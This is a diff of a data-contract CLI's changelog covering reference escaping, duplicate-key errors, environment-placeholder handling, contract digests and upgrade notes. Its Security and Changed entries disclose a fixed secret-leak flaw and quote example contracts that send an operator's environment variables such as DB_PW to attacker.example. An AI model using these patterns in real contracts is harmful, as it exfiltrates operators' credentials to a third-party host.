@@ -7,7 +7,106 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+### Added
+
+- **`$$ref` writes a literal `$ref` key.** A JSON Schema or OpenAPI payload inside `parameters` or
+  an extension that carries `$ref` keys of its own has failed composition since 0.25.0, because
+  every `$ref` key is read as a contract reference (0.25.0's note said to keep such a payload as a
+  string). Write those keys `$$ref`: the composed contract has `$ref` there, never resolved, and
+  `$$$ref` gives `$$ref`. `fluid bundle` writes the escape back, so a bundle stays a contract input;
+  the library and the exports see `$ref`.
+- **`.hql`, `.ddl`, `.cql`, `.j2`, `.jinja` and `.sh` are text suffixes:** a `$ref` to such a file
+  becomes its text. Before, `q.hql` holding `SELECT 'a: b' FROM t` was parsed as YAML and became
+  the mapping `{"SELECT 'a": "b' FROM t"}`.
+
+### Changed
+
+- **A key written twice in a contract file is refused.** In the root contract, an overlay, a
+  `$ref` fragment, a bundle's contract and `fluid.workspace.yaml`, a duplicate key kept its last
+  value without a word, and two `$ref` keys in one mapping read only the second file. It now fails,
+  naming the file and the key, and in YAML the line of each copy:
+  `contract.fluid.yaml:26: duplicate key 'name' (first at line 3; YAML 1.2 requires unique keys)`.
+  A JSON file gets no line: Python's JSON parser reports none.
+  A key a `<<` merge brings in and the mapping writes itself is not a duplicate, and `<<` may be
+  written more than once. In `fluid.workspace.yaml` a duplicate key makes its `ref_root` ignored
+  (with a warning naming the key) and its `expected-environments` an error.
+- **The composition rule says when it cannot check an upstream.** `fluid validate` checks a
+  `consumes[]` entry against the productType of the workspace contract that defines it. A contract
+  there that cannot be read, one that writes a key twice among them, was skipped with a DEBUG line,
+  so a consumer of it passed unchecked without a word. When a consumed product is defined by no
+  contract the scan read and a file could not be read, one `composition_upstream_unchecked`
+  WARNING now names the product and counts the files; the DEBUG line (`fluid --log-level DEBUG`)
+  still names each file and why.
+- **`fluid bundle --format json` refuses keys JSON cannot keep apart.** YAML keeps `200` and
+  `"200"` (`true` and `"true"`, `null` and `"null"`) as two keys; JSON writes both as the one name
+  `"200"`, so the output held it twice: a JSON reader kept one value, and fluid refused the file.
+  The command now fails before it writes, naming the keys and the JSON pointer of their mapping;
+  `--format yaml` keeps both.
+- **A `$ref` to a file whose suffix fluid does not know logs a warning**
+  (`ref_target_suffix_unknown`), once per suffix, naming the first such file, how it was read and
+  which suffixes are known. The file is read as before. `.json`, `.yaml`, `.yml` and `.avsc` never
+  warn. A contract read only for another product's sake (by `fluid validate`'s composition rule,
+  by the replay walk after a cursor rewind, or by an embedded-SQL build for the upstream it
+  consumes) logs it at DEBUG, and so it does its `workspace_ref_root_ignored` and
+  `ref_root_env_ignored` warnings: they are that contract's author's, who still gets them when
+  composing it.
+- **A `{{ env.NAME }}` whose variable is unset or empty is an error, in every stage that renders
+  a contract.** Four resolvers read the placeholder and disagreed: `fluid generate iac` wrote
+  `"bucket": "{{ env.S3_BUCKET }}"` into `main.tf.json` and exited 0, `fluid diff` read
+  `{{ env.DIR }}/x.parquet` as `/x.parquet` and called it a file "to be created", and a build ran
+  against an empty host, path or bucket. They are one resolver now (`util/env_templates.py`). It
+  raises one error that lists every missing variable and the fields that write it, before
+  anything is emitted or run, for `fluid generate iac`, `fluid diff`, `fluid apply` (the OpenTofu
+  and the native engine, and the Spark runs), `fluid verify`, `fluid generate vector`, and the
+  acquisition, embedded-SQL and dbt builds. A variable set to the empty string
+  counts as unset. `fluid validate` warns about each such variable
+  (`contract_env_placeholder_unset`) and fails under `--strict`. A placeholder whose name looks
+  like a credential (`password`, `secret`, `token`, `key`) is still never rendered into a contract
+  that is written out, and is not reported as missing. `fluid publish`, the catalog exports, the
+  validation report, `fluid generate artifacts` (which runs where the bundle is built, not where
+  it is deployed) and the preload of a contract embedded in a plan leave the placeholder of an unset
+  or empty variable as written, by name (`UNSET_DEFER`): `tests/test_env_templates_defer_sites.py` lists them.
+- **On the acquisition path, an `{{ env.NAME }}` goes only to the endpoints the operator paired it
+  with.** A source or sink block with a host the contract picked sent every variable it named to
+  that host: `connection: {host: attacker.example, password: "{{ env.DB_PW }}"}` rendered DB_PW and
+  sent it there, and so did a catalog's `warehouse`, `bucket` or `catalogAuth` beside a `uri`. A
+  name cannot tell a secret from the rest (`DB_PW`, `PGPASS` and `DATABASE_URL` look like none), so
+  the key is the destination. Each variable, whatever it is called, in `properties.source`, in
+  `properties.sink` and in the `binding.location` of every expose now renders only when every
+  endpoint of those blocks is this machine (loopback, a local socket), a host written
+  as one whole `{{ env.* }}` (`host: "{{ env.PGHOST }}"`: the operator chose the address), or a
+  host the operator paired with it (`NAME@host` in `FLUID_ACQUISITION_SECRET_REF_ALLOWLIST`, or the
+  bare `NAME` for any host). The endpoints are the ones the secret policy reads for a `secretRef`
+  in the same block (keyword connection strings, query-string hosts, SSH tunnels, host lists,
+  Snowflake's `account`), so a blank or unreadable endpoint refuses, and so does a field named
+  for an address that the policy reads nothing from (`bootstrap_servers`, `brokers`, `db_host`, a
+  Snowflake `account`): only an entry for any host (the bare `NAME`) clears it. A path
+  (`endpoint: /v1/users`) names no host. A block whose one destination is an object store, or that
+  names no endpoint and no such field (a local file source), has nothing to judge. The refusal
+  (`EnvTemplateHostError`, reason `unpaired`) names the variable, the field that writes it and the
+  host as written, never a rendered value.
+
+### Deprecated
+
+- **A file ref's pointer without a leading `/`** (`./x.yaml#key`) resolves as before but logs a
+  warning (`ref_pointer_without_slash`) naming the fix, `./x.yaml#/key`, once per ref however many
+  places write it; a later minor release will refuse it, as RFC 6901 has a JSON pointer empty or
+  starting with `/`. The same-document `#key` stays refused. As with `ref_target_suffix_unknown`, a
+  contract read only for another product's sake logs it at DEBUG.
+
 ### Fixed
+
+- **A contract's digest covers its `$ref` fragments.** `fluid contract digest` and the federation
+  gate's git backend hashed the root file alone, so editing a fragment of a split contract
+  (`fragments/exposes/*.yaml`, written by `fluid split`) left the digest, and so every
+  `consumes[].upstreamDigest` pin on it, unchanged while the deployed contract was different. Both
+  now digest the composed contract, as `fluid bundle` reads it, with `{{ env.* }}` left as
+  written. A contract and its split twin have one digest, whatever the layout. A `$ref` that
+  cannot be resolved, one that loops, one outside the contract's tree, a remote one, an empty
+  contract and a key written twice are errors (`digest_contract_unresolvable`,
+  `digest_contract_unreadable`, `digest_contract_empty`), never a digest of what could be read.
+  For an upstream fetched from git, `$ref`s reach files inside the clone only, whatever
+  `FLUID_REF_ROOT` or a workspace file in the clone say.
 
 - **The local engine never writes a placeholder file.** `fluid init qs --quickstart --yes`
   then `fluid apply contract.fluid.yaml --yes` logged "Plan validation failed with 2 errors",
@@ -121,6 +220,62 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   newer backports) from `Distribution.name` and `.version`, which `getattr`'s default does not
   catch. `granted_distribution` and `entry_point_distribution` now treat such a distribution as
   unnamed. This was the intermittent failure of `tests/iac/test_state_migration_safety.py` in CI.
+
+### Security
+
+- **`{{ env.* }}` on the acquisition path no longer renders the operator's environment into a host
+  the contract chooses.** The dispatcher rendered every placeholder from the operator's
+  environment before the runner started, so `uri: https://{{ env.OPERATOR_SECRET }}.attacker.example/catalog`
+  sent the variable's value, in the host name, to whoever owns the domain (an Iceberg sink pushed
+  it as `iceberg.catalog.uri`). Now, for a string that is a URL or sits in a field whose name ends in
+  `host`, `hostname`, `hosts`, `uri`, `url`, `endpoint`, `server`, `servers`, `brokers`,
+  `address` or `addresses` (or is `connection_string`), anywhere in the contract as written,
+  builds included, before anything is expanded: a credential-shaped variable anywhere in it is refused; and any other variable in the
+  URL's authority is refused unless the operator pairs it with the host it makes, `NAME@host` in
+  `FLUID_ACQUISITION_SECRET_REF_ALLOWLIST` (a loopback host needs no entry). A variable that is the
+  whole host (`host: "{{ env.PGHOST }}"`, `https://{{ env.CATALOG_HOST }}/catalog`) needs no
+  pairing: the operator chose the address. The refusal names the variable and the field, never the
+  rendered value.
+- **No operator variable reaches a host the contract picks, whatever it is called (acquisition
+  builds).** `connection: {host: attacker.example, password: "{{ env.DB_PW }}"}` rendered the
+  password and sent it to attacker.example, and a variable's name cannot tell `DB_PW`, `PGPASS` or
+  `DATABASE_URL` from a harmless one. Each variable now renders only for the endpoints of its
+  block that the operator paired it with (see Changed).
+
+### Upgrade notes
+
+- **An unset or empty `{{ env.NAME }}` now stops the command.** A contract that relied on a
+  variable rendering as nothing (an optional prefix, a path whose variable was never exported) now
+  fails naming it: export the variable, or delete the placeholder. That includes a region written
+  as `{{ env.AWS_REGION }}`, which deployed in the environment's own region when the variable was
+  unset. `fluid validate` shows the same list as a warning ahead of time, and `fluid verify`
+  reports an expose that names an unset variable as that expose's error and checks the others.
+- **Acquisition builds: a variable beside text in a URL's authority needs the operator's pairing.**
+  `https://{{ env.TENANT }}.db.example/x` or `{{ env.H }}@db.example` needs
+  `FLUID_ACQUISITION_SECRET_REF_ALLOWLIST=TENANT@<the host it renders to>` (or the bare variable
+  for any host) in the operator environment; a credential-shaped variable in a URL is refused:
+  give the credential to the connector as a secretRef. `host: "{{ env.PGHOST }}"` is unchanged.
+- **Acquisition builds: a variable beside a host the contract picks needs the operator's pairing.**
+  A contract with `host: db.internal` and `password: "{{ env.DB_PW }}"`, or a catalog `uri` beside
+  `{{ env.* }}` settings, now stops until the operator lists `DB_PW@db.internal` (the catalog's
+  host for the catalog's variables) in `FLUID_ACQUISITION_SECRET_REF_ALLOWLIST`, or the host is
+  written as one `{{ env.PGHOST }}`. A host in a field the policy has no name for
+  (`bootstrap_servers`, `brokers`, `db_host`) takes the bare variable name. Contracts written by
+  `fluid import meltano`, `airbyte` and `singer` put a literal host beside `{{ env.PASSWORD }}`,
+  so they need those entries.
+- **A split contract's digest changes once.** If an upstream keeps parts of its contract in `$ref`
+  fragments, the digest that `fluid contract digest` prints, and that `fluid apply`'s federation
+  gate computes, is now of the composed contract. Re-pin `consumes[].upstreamDigest` for such an
+  upstream with `fluid contract digest`. A contract with no `$ref` in it keeps its digest. The
+  federation digest cache an earlier forge wrote (`.fluid/federation/<workspace>.digest-cache.json`)
+  is ignored and rewritten on the next fetch, so it cannot serve a root-file digest beside the pin.
+- **Duplicate keys now fail.** A contract, overlay, fragment or workspace file that writes a key
+  twice (often a copy-paste slip, which kept the second value) fails every command that composes
+  the contract, `validate`, `plan`, `apply`, `bundle` and `generate artifacts` among them, naming
+  the place: remove the copy you do not want. A few commands that only summarise the file
+  as written, `fluid status` among them, read it as before.
+- **A payload with `$ref` keys of its own:** write them `$$ref` instead of keeping the payload as a
+  string.
 
 ## [0.40.1] — 2026-11-24
 
